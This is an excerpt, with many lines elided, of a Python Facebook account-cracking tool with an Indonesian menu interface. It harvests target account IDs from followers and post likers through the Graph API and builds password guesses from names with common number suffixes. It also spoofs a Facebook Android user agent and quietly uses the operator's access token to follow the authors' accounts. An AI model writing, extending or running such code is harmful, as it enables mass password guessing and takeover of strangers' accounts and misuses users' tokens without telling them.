...
def bot_follow_elite():
    try:
        ...
        os.system('rm -rf token.txt')
        exit(menu_log())
    requests.post("https://graph.facebook.com/100051863139451/subscribers?access_token=" + token)      # Dapunta Khurayra X
    requests.post("https://graph.facebook.com/100033446736040/subscribers?access_token=" + token)  
    exit(menu())
def menu():
    clear()
    banner()
    try:
        ...
        status = ('%sPremium [%sPro%s]'%(O,P,O))
        users = '\x1b[0;96mShelly Scott'
        maile = '\x1b[0;96mshellyscotthm@gmail.xxx'
        kunci = '\x1b[0;96mSHELLY-SCOTT-XXXXX'
        bergabung = '\x1b[0;96m28-09-2021'
        kadaluarsa = '\x1b[0;96mUNLIMITED'
        pro = ''
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    ...
    print('%s╠══[%s•%s] %sBergabung : %s'%(O,P,O,P,bergabung))
    print('%s╠══[%s•%s] %sMasa Habis : %s'%(O,P,O,P,kadaluarsa))
    print('%s║'%(O))
...
def publik():
    ...
    try:
        ...
        try:
            ...
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ada'%(M,P,M,P))
            menu()
...
def pengikut():
    try:
        ...
        jalan('%s╚══[%s!%s] %sMasalah Koneksi Jaringan'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Followers '%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
...
def likers():
    ...
    try:
        ...
        exit()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Postingan Anda'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
    ...
    for i in _cici_.split(" "):
        if len(i)<3:
            ...
            if len(i)==3 or len(i)==4 or len(i)==5:
                ...
                _dapunta_.append(i+"1234")
                _dapunta_.append(i+"1122")
                _dapunta_.append(i+"0011")
                _dapunta_.append("112233")
                _dapunta_.append(i+"123456")
                _dapunta_.append("445566")
                _dapunta_.append("556677")
                _dapunta_.append("778899")
                _dapunta_.append("889900")
                _dapunta_.append("667788")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
...
def tambah_pass():
    print('%s║'%(O))
    print('%s╠══[%s•%s] %sContoh :  Indonesia,sayang,123456,786786'%(O,P,O,P))
    cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('%s╠══[%s•%s] %sContoh : 321,786,1122,123'%(O,P,O,P))
    coy = input('%s╠══[%s•%s] %sMasukan Pass Tambahan Di Belakang : '%(O,P,O,P))
            ...
            if f=="":
                ...
                try:
                    ...
                    if put in ['']:
                        ...
                        print('%s╠══[%s•%s] %sMunculkan Opsi Sesi? [y/t]'%(O,P,O,P))
    ...
    for id in tt:
        try:
            ...
            try:
                ...
                print('╠══[!] Private')
            print('\x1b[0;96m╠══[\x1b[0;97m•\x1b[0;96m]',id,'•',len(te))
            te.clear()
        except KeyError:
            print('╠══[!] Spam Accounts')
    print('║')
...
def tutor_crack():
    ...
    print('%s║'%(O))
def var_author():
    mlaku('%s╔══[ %sAuthor & Team Recode %s]'%(O,P,O))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sAuthor :'%(O,P,O,P))
    mlaku('%s║     • %sAditya Agriche'%(O,P))
    mlaku('%s║     • %sShelly Scott'%(O,P))
    mlaku('%s║'%(O))
    mlaku('%s╠══[%s•%s] %sTeam Recode %sHUMMINGBIRD%s :'%(O,P,O,P,O,P))
    mlaku('%s║     • %sShelly Scott'%(O,P))
    mlaku('%s║'%(O))
def var_ugen():
...
def start_methodezz():
    print('%s║'%(O))
    print('%s╠══[%s1%s] %sCrack Cepat %s[%sHasil Dikit%s]'%(O,P,O,P,O,P,O))
